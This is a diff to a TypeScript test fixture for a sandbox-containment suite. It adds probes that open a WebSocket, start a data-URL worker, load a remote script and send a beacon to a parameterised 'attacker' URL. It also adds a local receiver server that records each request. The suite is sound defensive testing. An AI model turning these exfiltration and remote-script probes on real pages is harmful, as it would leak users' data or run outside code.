@@ -1,3 +1,7 @@
+import { once } from "node:events";
+import { createServer } from "node:http";
+import type { Server } from "node:http";
+
 /**
  * The App the screen tests run: notes that update live for everyone, a
  * button that fails, an answer that looks like the platform's error, and
@@ -90,17 +94,6 @@ const settled = async (attempt: () => unknown): Promise<string> => {
   }
 };
 
-const socketOutcome = async (): Promise<string> =>
-  await new Promise((resolve) => {
-    try {
-      const socket = new WebSocket(\`\${attacker.replace("http", "ws")}/socket\`);
-      socket.addEventListener("open", () => resolve("allowed"));
-      socket.addEventListener("error", () => resolve("blocked"));
-    } catch {
-      resolve("blocked");
-    }
-  });
-
 const imageOutcome = async (): Promise<string> =>
   await new Promise((resolve) => {
     const image = new Image();
@@ -108,6 +101,37 @@ const imageOutcome = async (): Promise<string> =>
     image.addEventListener("error", () => resolve("blocked"));
     image.src = \`\${attacker}/image\`;
   });
+
+/**
+ * Opens a socket to the attacker, starts a worker and loads a script of
+ * the attacker's. A browser that refuses one may say so or say nothing,
+ * so none is waited for: the attacker's server says what got out, and the
+ * page what ran.
+ */
+const startUnanswered = (): void => {
+  try {
+    const socket = new WebSocket(\`\${attacker.replace("http", "ws")}/socket\`);
+    socket.addEventListener("open", () => {
+      document.body.dataset.socket = "ran";
+    });
+  } catch {
+    // Refused outright.
+  }
+  try {
+    const worker = new Worker(\`data:text/javascript,fetch("\${attacker}/worker");postMessage(1)\`);
+    worker.addEventListener("message", () => {
+      document.body.dataset.worker = "ran";
+    });
+  } catch {
+    // Refused outright.
+  }
+  const remote = document.createElement("script");
+  remote.addEventListener("load", () => {
+    document.body.dataset.remoteScript = "ran";
+  });
+  remote.src = \`\${attacker}/script.js\`;
+  document.head.append(remote);
+};
 
 const probe = async (): Promise<Record<string, string>> => {
   const style = document.createElement("style");
@@ -128,12 +152,12 @@ const probe = async (): Promise<Record<string, string>> => {
   script.textContent = bridgeProbe;
   document.head.append(script);
   // Neither says whether it got out: the attacker's server does.
+  startUnanswered();
   navigator.sendBeacon(\`\${attacker}/beacon\`, "data");
   form.submit();
   return {
     fetch: await settled(async () => await fetch(\`\${attacker}/fetch\`)),
     fetchCore: await settled(async () => await fetch("/api/auth/get-session")),
-    socket: await socketOutcome(),
     image: await imageOutcome(),
     popup: await settled(() => window.open(\`\${attacker}/popup\`)),
     top: await settled(() => {
@@ -200,3 +224,32 @@ export const screenAppFiles = (attacker: string): Record<string, string> => ({
   "app/server.ts": serverCode,
   "screens/notes.tsx": screenCode(attacker),
 });
+
+/**
+ * The receiver a screen's attacks are aimed at: it counts every request
+ * that reaches it.
+ */
+export const serveAttacker = async (): Promise<{
+  url: string;
+  hits: string[];
+  server: Server;
+}> => {
+  const hits: string[] = [];
+  const server = createServer((request, response) => {
+    hits.push(request.url ?? "");
+    // A page, so a frame sent here loads it as any attacker's would.
+    response.setHeader("content-type", "text/html");
+    response.end("stolen");
+  });
+  // A WebSocket's opening request counts too, and gets no answer.
+  server.on("upgrade", (request, socket) => {
+    hits.push(request.url ?? "");
+    socket.destroy();
+  });
+  await once(server.listen(0, "127.0.0.1"), "listening");
+  const address = server.address();
+  if (address === null || typeof address === "string") {
+    throw new Error("The attacker's server has no port");
+  }
+  return { url: `http://127.0.0.1:${address.port}`, hits, server };
+};
